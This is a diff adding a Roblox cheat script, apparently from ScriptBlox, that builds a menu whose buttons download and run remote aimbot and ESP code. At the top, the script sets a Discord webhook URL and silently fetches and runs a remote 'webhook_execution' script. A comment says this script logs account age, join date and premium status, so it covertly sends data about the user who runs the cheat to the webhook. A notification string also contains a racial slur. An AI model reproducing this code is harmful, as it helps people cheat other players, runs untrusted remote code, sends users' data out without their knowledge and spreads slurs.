@@ -1,0 +1,51 @@
+--[[
+    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+getgenv().whscript = "SP1RIT SOFTAIM MOBILE"         --Change to the name of your script
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1246483448202268753/w9iW3nFOdRcfQUSaz1ErFJm5lTt9yyBSjycCaYY2TC4qzWo9tJVF6lmWqvt4i3ZccxdH"  --Put your Webhook Url here
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxhh/universalscripts/main/webhook_execution")))()
+
+--Added Account Age, Join Date, Premium Check,Automated Kick if Executed multiple Times!
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "SP1RIT SOFTAIM MOBILE", HidePremium = false, SaveConfig = true, ConfigFolder = "SP1RIT SOFTAIM"})
+
+OrionLib:MakeNotification({
+	Name = "SP1RIT SOFTAIM MOBILE",
+	Content = "Byfron is a nigga join discord.gg/0x504 and script it's just a test.",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+local AIMTab = Window:MakeTab({
+	Name = "AIMBOT",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+AIMTab:AddButton({
+	Name = "Aimbot",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Main.lua'))()
+  	end    
+})
+
+local ESPTab = Window:MakeTab({
+	Name = "ESP",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+ESPTab:AddButton({
+	Name = "Name esp",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/ESP-Script/main/ESP.lua"))()
+  	end    
+})
+
+ESPTab:AddButton({
+	Name = "Box ESP",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Boxes-Script/main/Boxes%20Script.lua"))()
+  	end    
+})
